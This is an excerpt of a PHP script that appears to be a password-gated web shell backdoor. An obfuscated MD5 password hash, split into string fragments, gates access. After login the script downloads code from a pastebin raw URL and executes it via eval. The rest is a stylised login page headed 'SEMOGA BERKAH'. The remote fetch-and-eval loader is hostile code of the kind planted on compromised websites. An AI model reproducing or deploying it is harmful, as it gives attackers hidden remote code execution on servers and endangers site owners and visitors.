...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '17'.'35'.'3d'.'b08'.'ac'.'81'.'2f'.'6d'.'0'.'58'.'89'.'35'.'10'.'e3'.'6f'.'16'.'49'.'4e'.'8f'.'68'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://pastebin.com/raw/17CYQPJC');
    eval('?>' . $a);
} else {
    ...
    <body>
      ...
      align-items: center;
      background: url('https://media.tenor.com/jIfa4bdSdxAAAAAC/cyberpunk.gif') no-repeat center center fixed;
      ...
      <label for="password"><center><h1>SEMOGA BERKAH</h1></center></label>
